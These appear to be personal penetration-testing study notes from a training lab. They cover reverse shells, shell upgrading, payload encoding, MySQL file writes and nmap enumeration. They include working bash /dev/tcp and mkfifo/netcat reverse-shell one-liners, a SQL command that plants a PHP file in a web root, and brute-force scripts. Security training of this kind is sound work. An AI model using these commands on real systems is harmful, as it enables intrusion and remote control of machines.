# Reverse Shells
- After Getting reverse shell (i.e. `netcat & bash -i >& /dev/tcp/1.2.3.4/4321 0>&1`)

## Upgrading
You should now have a reverse shell to the target machine, allowing you to run commands. However, if you've ever used SSH, you may notice that the functionality of this reverse shell is not exactly the same as an SSH connection. It is worse:

Doing `CTRL+C` drops the connection.
SSH doesn't work.
Text editors like vim won't work.
This happens for two reasons:

`CTRL+C` is sent to netcat, not over the network.
A tty has not been assigned to the shell.
Therefore, it is a good idea to upgrade your reverse shell to eliminate these two problems.

Firstly, you will get a `tty`. You can find out the current tty by using the command `tty`. If you run the command in the reverse shell, you will get the reply not a tty. An easy and frequently available way to get a tty in Linux is to use Python. Run the following command in the reverse shell:

`python -c 'import pty; pty.spawn("/bin/bash")'`

The command simply runs python code to spawn a new Bash instance with a tty.

After running the command, the output of tty should now be /dev/pts/NUM, where NUM is a number.

Next, you will improve the reverse shell so that CTRL+C and text editors start working properly.

To do this, type the following into the reverse shell terminal:
```
python -c 'import pty; pty.spawn("/bin/bash")' # - The command simply runs python code to spawn a new Bash instance with a tty.
CTRL+Z         # The combination of two keys, "ctrl" and "z", to background the process.
stty raw -echo # Input (such as CTRL+C) is not processed, just sent through, and not echoed back to you.
fg             # Foreground the process. Note - due to the previous command, when you type this, then the characters will not be echoed back to you.
reset          # Reset the terminal.
```
Do not be surprised if the terminal's indentation or output temporarily becomes weird while you do these steps. This is normal. If it asks you for the terminal type upon resetting, type xterm.

Type in the command reveal-answer to reveal the answer that lets you complete this objective. Note that it won't work if you have not upgraded your shell.


## Base64 and echo
`echo -n 'stringtoEncode' | base64 -w0`

By default, echo appends a newline to the end of a string. The `-n` ensures that the string stringToEncode is encoded, and not stringToEncode\n. Not adding the `-n` will usually not cause any problems with payloads, but it's important to keep such things in mind, as it does change the encoded result slightly.

By default, the base64 command inserts newline characters when the input is too long. The `-w0` flag disables that, and simply gives you a long encoded string. Simplicity is preferred in payloads, therefore the newlines are undesirable.


## mkfifo
There are times when you need to create a Linux reverse shell, but for one reason or another, you are unable to use Bash. Instead, all you can use is `/bin/sh`. In that case, another reliable reverse shell that's worth knowing is the **mkfifo reverse shell**.

Mkfifo stands for __Make [FIFO](https://en.wikipedia.org/wiki/FIFO_(computing_and_electronics))__. As the name says, it makes a FIFO special file in your filesystem. The FIFO file functions very similarly to a pipe in Linux. If one process writes "hello" to a FIFO file and another process simultaneously reads the FIFO file, then the reading process will read the string "hello". In other words, you're effectively using the FIFO file to pipe the string "hello" from one process to another.

Here is an example of a FIFO reverse shell that connects to 10.0.0.1 on port 1234:

- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
Let's break it down:
- `rm /tmp/f;`: If the file already exists, this command removes the `/tmp/f` file from any previous reverse shell attempts.
- `mkfifo /tmp/f;`: Creates a FIFO file at `/tmp/f`.
- `cat /tmp/f|/bin/sh -i 2>&1`: Reads input from `/tmp/f` and executes it using `/bin/sh`. `2>&1` means that stderr is redirected to stdout.
- `|nc 10.0.0.1 1234`: All output from the `/bin/sh` execution is sent back to the listener using netcat.
- `>/tmp/f`: Any incoming data from the listener is sent to /tmp/f where it will be read and executed.

# DNS Zone Transfers
`host servers.lab` - the `host` command will validate if a hostname exists and provide the IP Address.

# Exploiting Databases

## `mysql` Database Login
The syntax you need for the mysql tool is the following:

`mysql -u<username> -p<password> -h<host>`

## Reading Files
The syntax you need for the mysql tool is the following:

`mysql -u<username> -p<password> -h<host>`

## Writing Files
`SELECT '<text>' INTO OUTFILE '<file path>';`
For example: `select '<?php phpinfo() ?>' INTO OUTFILE '/var/www/html/pwned2.php';`

# Exploit Database/Recon
- www.exploit-db.com
- `searchsploit` cli tool


# Enumerating with `nmap`
SecLists github:https://github.com/danielmiessler/SecLists

## NSE
File location for NSE scripts: `/usr/share/nmap/scripts`

## SSH Enumeration
- Can run `ssh-auth-methods` to identify supported authentication methods
- `ssh-brute` can uses username and password wordlists to brute force server (`--script-args userdb=usernames.txt,passdb=passwords.txt`)

## SNMP Enumeration
SecList SNMP: https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt
- `snmp-brute` can brute force community strings (assigned different permissions and restrictions on ifnromation to access.  Either read-only (`public`) or read-write(`private`))
- `snmp-interfaces` ` - queries for network interfaces with SNMP
    - runs with `--script-args creds.snmp=Secret`
- `snmp-netstat` - queries all active connections
    - runs with `--script-args creds.snmp=Secret`
- `snmp-processes` - queries all processes running on target server
- Services - `snmp-win32-services.nse`
- File shares - `snmp-win32-shares.nse`
- Installed software - `snmp-win32-software.nse`
- Users - `snmp-win32-users.nse`

## SMB Enumeration
SMB = communication for haring files, printres, and serial ports
- __Authentication__: _User-level Authentication_ = username/password; _Share-level Authentication_ = anonymous login and password is given
- __Security Measures__: _Challenge/Response PW_ - any password used; _Message Signing_ - all messages must be signed
- `smb-security-mode` - general security configuration
- `smb-enum-users` - enumerate system users
- `smb-brute` - credentials of SMB users can be brute forced
    - Authentication type used by the script is not always compatible with the target SMB server
    - If the case, specify authenitcation type with the `--script-args smbtype=v2`
- `smb-enum-shares` - enumerate file shares
- combine with `smb-ls` (i.e. `--script smb-enum-shares,smb-ls`) to automatically list all enumerated file shares. All available shares identified by `smb-enum-shares` are passed onto the `smb-ls` script and listed

## NFS Enumeration
Network File System - exports and shares filesystems to mount locally and access by permitted clients
- All exports kept in `/etc/exports`, along with whitelisted IPs and ACLs
- `nfs-showmount` - shows all configured exports, and whitelisted IPs. SImilar to `showmount -e <host>` which shows identical info
- `nfs-ls` - gets an overview of file contents without mounting and accessing a remote share.  Doesn't have recursive listing
    - Easy to mount a share and look:
        - `sudo mkdir -p /nfs/public`
        - `sudo mount server:/var/nfs/public /nfs/public`

## `nmap` Flags
- Use `-sn` for a host discovery scan
- `--resume <filename>` resumes a paused/stopped scan
- `--open` flag filters out only

# Discovery and Enumeration
## EyeWitness for Enumeration
Crawls websites and takes screenshots


# Nmap Book
Good walkthrough of recon: https://nmap.org/book/solution-find-open-port.html
Shows use of `ping`, `whois`, `dig` to analyze how to shape the `nmap` scan.

## Reducing Scantimes
https://nmap.org/book/reduce-scantime.html
- Skip Port Scan (`-sn`)
- Limit number of ports scanned
- Skip advanced scan types (`-sC`, `-sV`, `-O`, `--traceroute`, and `-A`)
- Turn off DNS Resolution (`-Pn` or specify `-R`, disable with `-n`)
    - nmap hos tmachine can handle name resolution with `--system-dns` but will slow scans down

https://nmap.org/book/performance-low-level.html
Low level timing

Mapping of `T#` to Low Level Values: https://nmap.org/book/performance-timing-templates.html